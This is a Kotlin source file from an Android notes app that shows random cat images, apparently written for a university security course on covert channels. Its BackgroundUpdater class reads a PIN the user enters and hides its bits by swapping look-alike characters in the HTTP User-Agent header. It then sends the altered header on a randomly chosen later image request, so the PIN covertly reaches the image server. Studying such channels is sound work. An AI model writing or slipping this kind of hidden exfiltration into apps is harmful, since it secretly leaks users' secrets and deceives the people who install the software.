package nl.utwente.ewi.scs.secretnotestaker.secretnotestakerultra

import android.graphics.BitmapFactory
import android.preference.PreferenceManager
import android.util.Log
import java.lang.StringBuilder
import java.net.HttpURLConnection
import java.net.Socket
import java.net.URL
import java.util.*


class BackgroundUpdater(val activity: TakesNotesActivity?) : Runnable {
    val LOG_TAG = "BackgroundUpdater"
    private var stopNow = false
    private lateinit var thread: Thread

    fun start() {
        thread = Thread(this)
        stopNow = false
        thread.start()
    }

    fun stop() {
       // activity = null
        stopNow = true
        thread.interrupt()
    }

    fun getUrl(): String {
        val sharedPref = PreferenceManager.getDefaultSharedPreferences(activity)
        val url = sharedPref.getString("url", "")
        // url should contain the URL to the cat image server without the trailing /randomcat

        if (url.takeLast(1) == "/") {
            return url + "randomcat"
        } else {
            return url + "/randomcat"
        }
    }

    val random = Random()
    var curRequest = 0
    var onRequest = 0
    var send = false

    override fun run() {
        //This is the original user agent
        val userAgentOriginal = "Dalvik/2.1.0 (Linux; U; Android 8.0.0; Mi A1 MIUI/V.9.5.10.0.ODHMIFA)";

        var userAgentBuilder = StringBuilder(userAgentOriginal)

        while (true) {
            if (stopNow) {
                // Activity has been terminated, also terminate the thread
                return
            }

            if(onRequest>0)
                curRequest++

            Log.i(LOG_TAG, "onRequest: " + onRequest);
            if(onRequest==0)
            {

                //Get the pin from the edit text
                val pin  = activity!!.getNumber()
               // Log.i(LOG_TAG,"pin is " + pin)


                //Check if pin is valid
                if(pin!=-1) {
                    if (pin == 0) {
                        userAgentBuilder.setCharAt(0, 'd')
                    } else {
                        //Convert our pin into binary array
                        val bits = Utils.toBinary(pin, 14);
                        Log.i(LOG_TAG, "bits: " + Arrays.toString(bits));

                        //For every bit that is true, change the character with similar one
                        if (bits[0]) userAgentBuilder.setCharAt(11, 'O')
                        if (bits[1]) userAgentBuilder.setCharAt(14, 'l')
                        if (bits[2]) userAgentBuilder.setCharAt(19, ':')
                        if (bits[3]) userAgentBuilder.setCharAt(21, 'u')
                        if (bits[4]) userAgentBuilder.setCharAt(22, ':')
                        if (bits[5]) userAgentBuilder.setCharAt(34, 'O')
                        if (bits[6]) userAgentBuilder.setCharAt(36, 'O')
                        if (bits[7]) userAgentBuilder.setCharAt(37, ':')
                        if (bits[8]) userAgentBuilder.setCharAt(39, 'm')
                        if (bits[9]) userAgentBuilder.setCharAt(42, 'a')
                        if (bits[10]) userAgentBuilder.setCharAt(50, 'v')
                        if (bits[11]) userAgentBuilder.setCharAt(57, 'O')
                        if (bits[12]) userAgentBuilder.setCharAt(59, 'O')
                        if (bits[13]) userAgentBuilder.setCharAt(61, '0')
                       // Log.i(LOG_TAG, "agent: " + userAgentBuilder.toString())

                    }
                    //send the pin in some future request
                    onRequest = random.nextInt(10 - 4) + 4
                   // Log.i(LOG_TAG, "onRequest: " + onRequest);
                    //Block the ui
                    activity!!.runOnUiThread(Runnable {
                        activity.etNotes!!.isEnabled = false
                    })
                }
            }


            send = false
            //Check is this the right request to send the pin
            if(curRequest==onRequest && curRequest!=0)
            {
                send = true
                onRequest=0
                curRequest=0
            }

            try {

                // Get the URL of our randomcat server
                val url = URL(getUrl())

                // Open an HTTP connection to that URL
                   val urlConnection = url.openConnection() as HttpURLConnection

                //This is the right request, so set the user agent
                if(send) {
                    urlConnection.setRequestProperty("User-Agent", userAgentBuilder.toString())
                    Log.i(LOG_TAG,"send pin");
                    activity!!.runOnUiThread(Runnable {
                        activity.etNotes!!.isEnabled = true
                    })
                    //RESet the user agent
                    userAgentBuilder = StringBuilder(userAgentOriginal)
                }else{
                    //Remove
                    urlConnection.setRequestProperty("User-Agent", userAgentOriginal)
                }



                 try {
                      // Try to decode a bitmap from the server response
                      var bitmap = BitmapFactory.decodeStream(urlConnection.inputStream)

                      // Update the activity with the new images.
                      activity!!.runOnUiThread(UpdateImageRequest(bitmap, activity!!))
                  } catch (e: Exception) {
                      Log.e("Network", "HTTP request failed for URL: " + url + " or download problem", e)
                  } finally {
                      urlConnection.disconnect()
                  }
            } catch (e: Exception) {
                Log.e("Network", "Problem with download", e)

        } finally {

        }
            Log.d("Background", "Completed network operation, now sleeping")
            try {
                Thread.sleep(5000)
            } catch (e: InterruptedException) {

            }
        }
    }
}